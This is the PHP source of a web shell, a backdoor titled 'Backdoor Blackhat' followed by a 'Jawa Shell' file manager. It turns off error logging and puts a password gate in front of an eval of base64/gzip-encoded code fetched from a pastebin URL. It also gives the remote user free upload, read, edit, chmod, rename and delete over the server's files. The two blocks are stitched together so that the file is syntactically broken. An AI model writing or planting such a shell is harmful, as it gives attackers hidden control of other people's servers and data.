<?php
@session_start(); 
@error_reporting(0); 
@error_log(0);
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0);
$lol="fa16be86907c159a6e051848a80bdb3a"; //password(md5)
function printLogin() { 
    ?> 
<html>
<head>
<title>Backdoor Blackhat</title>
<link href='https://i.ibb.co/XFcgj2y/blogspot-mrquixter.jpg' rel='icon' type='image/x-icon'/>
<meta name='author' content='0x1999'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Abel);
html {
	background: #000000;
	color: #ffffff;
	font-family: 'Abel';
	font-size: 13px;
	width: 100%;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Abel';
	font-size: 13px;
}
</style>
</head>	
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style><center><img src="https://i.ibb.co/XFcgj2y/blogspot-mrquixter.jpg" class="shakeimage" onmouseout="init(this);rattleimage()" onmouseover="stoprattle(this);top.focus()" onclick="top.focus()" height="320px"><br>
    <center>  
    <form method=post> 
    <input type=password name=jancox> 
    </form></center> 
    <?php 
	eval(gzinflate(base64_decode(file_get_contents('http://pastebin.com/raw/6PJ9Pj8F'))));
    exit; 
} 
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['jancox'] ) && ( md5($_POST['jancox']) == $lol ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
        
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
		$_POST[$key] = stripslashes($value);
	}
} echo '<!DOCTYPE HTML>
		<html>
		<head>
			<title>꧋ꦮ꦳ꦶꦕ꧀ꦏ꧀ꦪ꧀ꦒ ꦤ꧀ꦱ꧀</title>
			<link href="" rel="stylesheet" type="text/css">
			<style>
				body {
					font-family: "tahoma", cursive;
					background-color: black;
					color:lime;
				}
				#content tr:hover{
					text-shadow:0px 0px 10px;
				}
				#content .first{
				background-color: lime;
				}
				table{
					border: 1px #000000 dotted;
				}
				a{
					color:lime;
					text-decoration: none;
				}
				a:hover{
					color:white;
					text-shadow:0px 0px 10px transparent;
				}
				input,select,textarea{
					border: 1px yellow solid;
					-moz-border-radius: 5px;
					-webkit-border-radius:5px;
					border-radius:5px;
				}
			</style>
		</head>
		<body>
			<h1>
				<center>
					<font color="yellow">Jawa Shell</font>
				</center>
			</h1>
			<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
				<tr>
					<td>
						<font color="yellow">꧋ꦥꦺꦴꦱꦶꦱꦶꦏꦸ :</font> ';

if(isset($_GET['path'])){
	$path = $_GET['path'];
} else{
	$path = getcwd();
} 
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
	if($pat == '' && $id == 0){
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if($pat == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++){
		echo "$paths[$i]";
		if($i != $id) echo "/";
	}
	echo '">'.$pat.'</a>/';
} echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
	if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
		echo '<font color="cyan">Upload Succeeded</font><br />';
	} else{
		echo '<font color="red">Upload Failed</font><br/>';
	}
} echo '<form enctype="multipart/form-data" method="POST">
		<font color="white">File Up :</font> <input type="file" name="file" />
		<input type="submit" value="aplod :v" />
		</form>
		</td>
		</tr>';

if(isset($_GET['filesrc'])){
	echo "<tr><td>꧋ꦥꦺꦴꦱꦶꦱꦶꦏꦸ : ";
	echo $_GET['filesrc'];
	echo '</tr></td></table><br />';
	echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
	echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
	if($_POST['opt'] == 'chmod'){
		if(isset($_POST['perm'])){
			if(chmod($_POST['path'],$_POST['perm'])){
				echo '<font color="cyan">Change Permission Successful</font><br/>';
			} else{
				echo '<font color="red">Change Permission Failed</font><br />';
			}
		} echo '<form method="POST">
				Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
				<input type="hidden" name="path" value="'.$_POST['path'].'">
				<input type="hidden" name="opt" value="chmod">
				<input type="submit" value="Go" />
				</form>';
			} elseif($_POST['opt'] == 'rename'){
				if(isset($_POST['newname'])){
					if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
						echo '<font color="cyan">Rename Successfully</font><br/>';
					} else{
						echo '<font color="red">Rename Failed</font><br />';
					}
					$_POST['name'] = $_POST['newname'];
				} echo '<form method="POST">
						New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
						<input type="hidden" name="path" value="'.$_POST['path'].'">
						<input type="hidden" name="opt" value="rename">
						<input type="submit" value="Go" />
						</form>';
					} elseif($_POST['opt'] == 'edit'){
						if(isset($_POST['src'])){
							$fp = fopen($_POST['path'],'w');
							if(fwrite($fp,$_POST['src'])){
								echo '<font color="cyan">Successfully Edit File</font><br/>';
							} else{
								echo '<font color="red">Failed to Edit File</font><br/>';
							} fclose($fp);
						} echo '<form method="POST">
								<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
								<input type="hidden" name="path" value="'.$_POST['path'].'">
								<input type="hidden" name="opt" value="edit">
								<input type="submit" value="Save" />
								</form>';
							} echo '</center>';
						} else{
							echo '</table><br/><center>';
							if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
								if($_POST['type'] == 'dir'){
									if(rmdir($_POST['path'])){
										echo '<font color="cyan">Deleted Directory</font><br/>';
									} else{
										echo '<font color="red">Directory Failed Deleted</font><br/>';
									}
								} elseif($_POST['type'] == 'file'){
									if(unlink($_POST['path'])){
										echo '<font color="cyan">Deleted Files</font><br/>';
									} else{
										echo '<font color="red">File Failed Deleted</font><br/>';
									}
								}
							} echo '</center>';
							$scandir = scandir($path);
							echo '<div id="content">
								  <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
								 	<tr class="first">
										<td>
											<center>꧋ꦗꦺꦤꦺꦁ</peller></center>
										</td>
										<td>
											<center>꧋ꦈꦏꦸꦫꦤ꧀</peller></center>
										</td>
										<td>
											<center>꧋ꦆꦗꦶꦤ꧀</peller></center>
										</td>
										<td>
											<center>꧋ꦩꦺꦴꦣꦶꦥ꦳ꦶꦏꦱꦶ</peller></center>
										</td>
									</tr>';

foreach($scandir as $dir){
	if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
	echo '<tr>
		  <td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
		  <td><center>--</center></td>
		  <td><center>';
		  if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
		  elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
		  echo perms($path.'/'.$dir);
		  if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
		  echo '</center></td>
		  		<td><center><form method="POST" action="?option&path='.$path.'">
		  			<select name="opt">
		  				<option value="">Select</option>
						<option value="delete">Delete</option>
						<option value="chmod">Chmod</option>
						<option value="rename">Rename</option>
					</select>
					<input type="hidden" name="type" value="dir">
					<input type="hidden" name="name" value="'.$dir.'">
					<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
					<input type="submit" value=">">
					</form></center></td>
					</tr>';
				} echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';

foreach($scandir as $file){
	if(!is_file($path.'/'.$file)) continue;
	$size = filesize($path.'/'.$file)/1024;
	$size = round($size,3);
	if($size >= 1024){
		$size = round($size/1024,2).' MB';
	} else{
		$size = $size.' KB';
	} echo '<tr>
			<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
			<td><center>'.$size.'</center></td>
			<td><center>';

if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
	  <td><center><form method="POST" action="?option&path='.$path.'">
	  <select name="opt">
	  	<option value="">Select</option>
	  	<option value="delete">Delete</option>
	  	<option value="chmod">Chmod</option>
	  	<option value="rename">Rename</option>
	  	<option value="edit">Edit</option>
	  </select>
	  <input type="hidden" name="type" value="file">
	  <input type="hidden" name="name" value="'.$file.'">
	  <input type="hidden" name="path" value="'.$path.'/'.$file.'">
	  <input type="submit" value=">">
	  </form></center></td>
	  </tr>';
	} echo '</table></div>';
} echo "<br><center>Copyright © 1945 - </body></html>" . (int)date('Y'). " GOOGLE";

function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
		$info = 'p';
	} else {
	// Unknown
		$info = 'u';
	}
	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));
		// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));
		// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
?>